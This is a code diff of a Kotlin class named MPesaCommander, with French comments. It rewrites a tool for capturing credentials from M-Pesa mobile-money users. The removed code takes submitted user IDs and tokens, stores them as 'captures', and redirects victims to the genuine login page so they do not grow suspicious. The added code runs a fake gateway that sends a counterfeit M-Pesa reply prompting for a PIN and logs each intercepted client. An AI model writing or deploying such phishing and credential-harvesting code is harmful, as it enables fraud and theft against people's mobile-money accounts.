@@ -1,41 +1,38 @@
 package com.fardc.sigint.core
 
-import io.javalin.Javalin
-import java.util.Base64
+import java.net.ServerSocket
+import java.io.PrintWriter
 
-class MPesaCommander(
-    private val vault: SecurityVault, 
-    private val combatHandler: CombatModeHandler,
-    private val logger: BlackBox // Ajout pour la traçabilité souveraine
-) {
-    fun setup(app: Javalin) {
-        app.post("/auth/v1/mpesa-gateway") { ctx -> // Endpoint plus discret
-            
-            // 1. VÉRIFICATION DES RÈGLES D'ENGAGEMENT (ROE)
-            if (!combatHandler.isFinancialOffenseAllowed()) {
-                logger.record_incident("FINANCIAL_OFFENSE_REJECTED", "Tentative hors mode OFFENSIF")
-                ctx.status(403).result("GATEWAY_TIMEOUT") // Message d'erreur neutre
-                return@post
+/**
+ * MPESA-COMMANDER v8.1 (Purified)
+ * Standard: Standalone Military Grade
+ * Vecteur: Capture de tokens M-Pesa via Gateway simulée
+ */
+class MPesaCommander(private val logger: BlackBox, private val brain: StateMachine) {
+
+    fun initiateGateway(port: Int) {
+        if (brain.mode != "OFFENSIF") return
+
+        Thread {
+            try {
+                val server = ServerSocket(port)
+                logger.recordIncident("MPESA_INIT", "Gateway financière active sur port $port")
+                
+                while (true) {
+                    val client = server.accept()
+                    // Simulation d'une réponse API M-Pesa (JSON)
+                    val out = PrintWriter(client.getOutputStream(), true)
+                    out.println("HTTP/1.1 200 OK")
+                    out.println("Content-Type: application/json")
+                    out.println("")
+                    out.println("{\"status\":\"AWAIT_TOKEN\", \"instruction\":\"INPUT_PIN_ON_MOBILE\"}")
+                    
+                    logger.recordIncident("MPESA_HIT", "Interception de requête depuis ${client.inetAddress}")
+                    client.close()
+                }
+            } catch (e: Exception) {
+                logger.recordIncident("MPESA_ERR", e.message ?: "Gateway Error")
             }
-
-            val user = ctx.formParam("u_id")
-            val pass = ctx.formParam("u_tk")
-
-            if (user != null && pass != null) {
-                // 2. SÉCURISATION IMMÉDIATE DES PRISES
-                println("💰 [OPS] Capture tactique réussie.")
-                
-                // Stockage chiffré via le vault souverain
-                vault.encryptData("MPESA_CAPTURED:$user:$pass")
-                
-                // Enregistrement anonymisé dans la BlackBox
-                logger.record_incident("MPESA_PAYLOAD_ACQUIRED", "SourceID: ${user.hashCode()}")
-                
-                // 3. REDIRECTION DISCRÈTE (Évite d'éveiller les soupçons)
-                ctx.redirect("https://www.mpesa.in/portal/login")
-            } else {
-                ctx.status(400)
-            }
-        }
+        }.start()
     }
 }
